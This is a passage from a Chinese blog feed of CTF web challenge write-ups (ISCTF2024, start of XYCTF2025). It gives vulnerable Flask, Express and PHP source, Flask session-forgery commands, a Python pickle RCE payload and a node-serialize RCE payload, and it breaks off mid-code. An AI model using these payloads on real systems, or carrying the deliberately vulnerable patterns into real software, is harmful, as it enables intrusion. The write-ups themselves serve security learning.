class="hljs-string">&#x27;/news&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            session[<span class="hljs-string">&#x27;login_error&#x27;</span>] = <span class="hljs-literal">True</span>               <br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;login.html&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/news&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">news</span>():<br>    news = newslist.news_list<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;news.html&quot;</span>,news = news)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin</span>():<br>    <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;status&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">or</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">or</span> session.get(<span class="hljs-string">&#x27;password&#x27;</span>) != <span class="hljs-string">&#x27;admin222&#x27;</span>:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/login&quot;</span>)<br>    news = newslist.news_list<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;admin.html&quot;</span>,news = news)<br>    <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/create&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_news</span>():<br>    <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;status&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">or</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">or</span> session.get(<span class="hljs-string">&#x27;password&#x27;</span>) != <span class="hljs-string">&#x27;admin222&#x27;</span>:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/login&quot;</span>)   <br>    title = request.form.get(<span class="hljs-string">&#x27;title&#x27;</span>)<br>    content = request.form.get(<span class="hljs-string">&#x27;content&#x27;</span>)<br>    newslist.create_news(title,content)<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/admin&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/export&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">export_news</span>():<br>    <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;status&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">or</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">or</span> session.get(<span class="hljs-string">&#x27;password&#x27;</span>) != <span class="hljs-string">&#x27;admin222&#x27;</span>:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/login&quot;</span>)<br>    news_title = request.form[<span class="hljs-string">&quot;title&quot;</span>]<br>    result = newslist.export_news(news_title)<br>    <span class="hljs-keyword">if</span> result <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;result&quot;</span>: result&#125;)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;news not found&quot;</span>&#125;)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/add&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_news</span>():<br>    <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;status&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">or</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">or</span> session.get(<span class="hljs-string">&#x27;password&#x27;</span>) != <span class="hljs-string">&#x27;admin222&#x27;</span>:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/login&quot;</span>)    <br>    serialized_news = request.form[<span class="hljs-string">&quot;serialized_news&quot;</span>]<br>    <span class="hljs-keyword">if</span> newslist.add_news(serialized_news):<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/admin&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Failed to add news&quot;</span>&#125;)<br><br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">8888</span>, debug=<span class="hljs-literal">False</span>, threaded=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>源码中给出了SECRET_KEY可以进行seesion伪造，伪造管理员身份，NewList类中的add_news()方法进行了反序列化并添加一条新闻（通过&#x2F;add路由，提交base64编码的pickle数据打python反序列化）</p><p>先进行session伪造</p><blockquote><p>python flask_session_cookie_manager3.py decode -c “.eJyrVsrJT8_Mi08tKsovUrIqKSpN1VEqSCwuLs8vSlGyUipJLS4xNDRU0lEqLkksKS0GCpUWpxYB-SAqLzE3FapIqRYA7_MZ7A.aDRjvg.R4AEzHRJE7VSrm4qh3aemwSLHho” -s “W3l1com_isCTF”</p><p>python flask_session_cookie_manager3.py encode -t “{‘login_error’: True, ‘password’: ‘admin222’, ‘status’: ‘admin’, ‘username’: ‘admin’}” -s “W3l1com_isCTF”</p></blockquote><p>替换伪造的session后访问&#x2F;admin路由</p><p>打python反序列化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>payload = <span class="hljs-string">b&quot;&quot;&quot;cbuiltins</span><br><span class="hljs-string">eval</span><br><span class="hljs-string">(S&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].app.before_request_funcs.setdefault(None,[]).append(lambda:__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read())&quot;</span><br><span class="hljs-string">tR.&quot;&quot;&quot;</span><br><span class="hljs-built_in">print</span>(base64.b64encode(payload).decode())<br><br><span class="hljs-comment">#Y2J1aWx0aW5zCmV2YWwKKFMiX19pbXBvcnRfXygnc3lzJykubW9kdWxlc1snX19tYWluX18nXS5hcHAuYmVmb3JlX3JlcXVlc3RfZnVuY3Muc2V0ZGVmYXVsdChOb25lLFtdKS5hcHBlbmQobGFtYmRhOl9faW1wb3J0X18oJ29zJykucG9wZW4oJ2NhdCAvZmxhZycpLnJlYWQoKSkiCnRSLg==</span><br></code></pre></td></tr></table></figure><h2 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<br><span class="hljs-keyword">var</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-parser&#x27;</span>);<br><span class="hljs-keyword">var</span> serialize = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;node-serialize&#x27;</span>);<br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span> &#125;));<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">cookieParser</span>())<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, <span class="hljs-string">&#x27;./views&#x27;</span>);<br><br>users=&#123;<span class="hljs-string">&quot;guest&quot;</span>:<span class="hljs-string">&quot;123456&quot;</span>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">auth</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  <span class="hljs-keyword">if</span>(req.<span class="hljs-property">cookies</span>.<span class="hljs-property">token</span>)&#123;<br>    <span class="hljs-keyword">const</span> user = serialize.<span class="hljs-title function_">unserialize</span>(<span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(req.<span class="hljs-property">cookies</span>.<span class="hljs-property">token</span>,<span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-title function_">toString</span>());<br>    <span class="hljs-keyword">if</span> (!user.<span class="hljs-property">username</span>) &#123;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/login&#x27;</span>);<br>    &#125;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/login&#x27;</span>);<br>  &#125;<br>  <span class="hljs-title function_">next</span>();<br>&#125;<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/index&#x27;</span>,auth,<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res</span>)&#123;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&quot;index&quot;</span>);<br>&#125;);<br><br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/register&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res</span>)&#123;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&quot;register&quot;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/register&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res</span>)&#123;<br>    username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span>;<br>    password = req.<span class="hljs-property">body</span>.<span class="hljs-property">password</span>;<br><br>    <span class="hljs-keyword">if</span> (!username || !password) &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;用户名和密码都是必填项&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (users[username]) &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">409</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;用户名已存在&#x27;</span>);<br>    &#125;<br>    users[username] = password;  <br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">201</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;用户注册成功&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/login&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res</span>)&#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&quot;login&quot;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/login&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res</span>)&#123;<br>  username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span>;<br>  password = req.<span class="hljs-property">body</span>.<span class="hljs-property">password</span>;<br>  <span class="hljs-keyword">if</span> (!username || !password) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;用户名和密码都是必填项&#x27;</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (!(users[username])) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">409</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;用户名不存在&#x27;</span>);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">if</span>(users[username] === password)&#123;<br>      token=<span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(serialize.<span class="hljs-title function_">serialize</span>(&#123;<span class="hljs-string">&#x27;username&#x27;</span>:username,<span class="hljs-string">&#x27;isAdmin&#x27;</span>:<span class="hljs-literal">false</span>&#125;)).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;base64&#x27;</span>)<br>      res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">&#x27;token&#x27;</span>,token, &#123;<br>        <span class="hljs-attr">maxAge</span>: <span class="hljs-number">900000</span>,<br>        <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span><br>      &#125;);<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/index&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;密码错误&#x27;</span>);<br>    &#125;<br>  &#125;<br><br>&#125;);<br><br><span class="hljs-comment">// 启动服务器</span><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">80</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Server running at http://localhost:80`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>cookie处有反序列化，且node_serialize的0.0.4版本存在命令执行漏洞（<a href="https://xz.aliyun.com/news/6780%EF%BC%89">https://xz.aliyun.com/news/6780）</a></p><p>payload</p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scilab">&#123;<span class="hljs-string">&quot;rce&quot;</span>:<span class="hljs-string">&quot;_$$ND_FUNC$$_function()&#123;require(&#x27;</span>child_process&#x27;).<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;cat /flag&gt;./views/login.ejs&#x27;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(error, stdout, stderr)</span>&#123;<span class="hljs-title">console</span>.<span class="hljs-title">log</span><span class="hljs-params">(stdout)</span>&#125;);&#125;<span class="hljs-params">()</span>&quot;&#125;</span><br></code></pre></td></tr></table></figure><p>base64编码后，替换cookie，刷新登录页面得到flag</p><h2 id="ezejs"><a href="#ezejs" class="headerlink" title="ezejs"></a>ezejs</h2><h2 id="小蓝鲨的冒险"><a href="#小蓝鲨的冒险" class="headerlink" title="小蓝鲨的冒险"></a>小蓝鲨的冒险</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;isctf2024&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;b&quot;</span>];<br>@<span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>)) &#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;num&quot;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span> == <span class="hljs-number">2024</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;QAQ&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]/i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>) == <span class="hljs-number">2024</span>)&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;which&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$which</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;which&#x27;</span>];<br>            <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$which</span>)&#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                    <span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;QAQ&#x27;</span>);<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                    <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$which</span>.<span class="hljs-string">&#x27;.php&#x27;</span>;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-keyword">echo</span> GWF_HTML::<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;PHP-0817&#x27;</span>, <span class="hljs-string">&#x27;Hacker NoNoNo!&#x27;</span>, <span class="hljs-literal">false</span>);<br>                    <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>parse_str()：php中的一个函数，作用为将查询的字符串解析到变量中</p><p>@parse_str($b)：这个函数不会检测变量$b是否存在，如果通过其他方式传入数据给变量$b,且当前$b中数据存在，会将其直接覆盖</p><blockquote><p>b&#x3D;a[0]&#x3D;<em>240610708</em></p></blockquote><p>num不能等于2024，但num转化为整数后等于2024且num中不能含有字母</p><blockquote><p>num&#x3D;2024.1</p></blockquote><p>第一个case没有加break，字符串flag与0匹配（<strong>在php中，对于纯数字类型的switch在遇到字符或字符串时会强制int转换</strong>，本题转换为0），继续向下执行，到case3输出flag</p><p><img src="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/mx.png"></p><h2 id="小蓝鲨的临时存储室"><a href="#小蓝鲨的临时存储室" class="headerlink" title="小蓝鲨的临时存储室"></a>小蓝鲨的临时存储室</h2><h2 id="小蓝鲨的书店"><a href="#小蓝鲨的书店" class="headerlink" title="小蓝鲨的书店"></a>小蓝鲨的书店</h2><h2 id="小蓝鲨的故事"><a href="#小蓝鲨的故事" class="headerlink" title="小蓝鲨的故事"></a>小蓝鲨的故事</h2><h2 id="小蓝鲨的秘密"><a href="#小蓝鲨的秘密" class="headerlink" title="小蓝鲨的秘密"></a>小蓝鲨的秘密</h2><p>bp直接抓包</p><p><img src="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/mimi.png"></p><h2 id="蓝鲨的java入门课堂"><a href="#蓝鲨的java入门课堂" class="headerlink" title="蓝鲨的java入门课堂"></a>蓝鲨的java入门课堂</h2><p>参考博客：</p><p><a href="https://blog.csdn.net/2301_79700060/article/details/143854365">https://blog.csdn.net/2301_79700060/article/details/143854365</a></p><p><a href="https://www.zijie.fun/2024/11/11/ISCTF2024/">https://www.zijie.fun/2024/11/11/ISCTF2024/</a></p><p><a href="https://yxing-1.github.io/2025/02/03/ISCTF2024%E5%A4%8D%E7%8E%B0/">https://yxing-1.github.io/2025/02/03/ISCTF2024%E5%A4%8D%E7%8E%B0/</a></p><p><a href="https://tremse.github.io/2024/11/18/wpforisctf2024/#wp-for-isctf2024">https://tremse.github.io/2024/11/18/wpforisctf2024/#wp-for-isctf2024</a></p><p><a href="https://nanian-233.github.io/posts/ISCTF2024.html">https://nanian-233.github.io/posts/ISCTF2024.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xyctf2025_web复现</title>
    <link href="/2025/05/11/xyctf2025-web%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/05/11/xyctf2025-web%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="Fate"><a href="#Fate" class="headerlink" title="Fate"></a>Fate</h2><p>源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> flask<br><span class="hljs-keyword">import</span> sqlite3<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> json<br><br>app = flask.Flask(__name__)<br>blacklist = string.ascii_letters<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">binary_to_string</span>(<span class="hljs-params">binary_string</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(binary_string) % <span class="hljs-number">8</span> != <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;Binary string length must be a multiple of 8&quot;</span>)<br>    binary_chunks = [binary_string[i:i+<span class="hljs-number">8</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(binary_string), <span class="hljs-number">8</span>)]<br>    string_output = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(chunk, <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> binary_chunks)<br>    <br>    <span class="hljs-keyword">return</span> string_output<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/proxy&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">nolettersproxy</span>():<br>    url = flask.request.args.get(<span class="hljs-string">&#x27;url&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> url:<br>        <span class="hljs-keyword">return</span> flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&#x27;No URL provided&#x27;</span>)<br>    <br>    target_url = <span class="hljs-string">&quot;http://lamentxu.top&quot;</span> + url<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> url:<br>            <span class="hljs-keyword">return</span> flask.abort(<span class="hljs-number">403</span>, <span class="hljs-string">&#x27;I blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-keyword">in</span> url:<br>        <span class="hljs-keyword">return</span> flask.abort(<span class="hljs-number">403</span>, <span class="hljs-string">&#x27;No ssrf allowed&#x27;</span>)<br>    response = requests.get(target_url)<br><br>    <span class="hljs-keyword">return</span> flask.Response(response.content, response.status_code)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db_search</span>(<span class="hljs-params">code</span>):<br>    <span class="hljs-keyword">with</span> sqlite3.connect(<span class="hljs-string">&#x27;database.db&#x27;</span>) <span class="hljs-keyword">as</span> conn:<br>        cur = conn.cursor()<br>        cur.execute(<span class="hljs-string">f&quot;SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(&#x27;<span class="hljs-subst">&#123;code&#125;</span>&#x27;)))))))&quot;</span>)<br>        found = cur.fetchone()<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">if</span> found <span 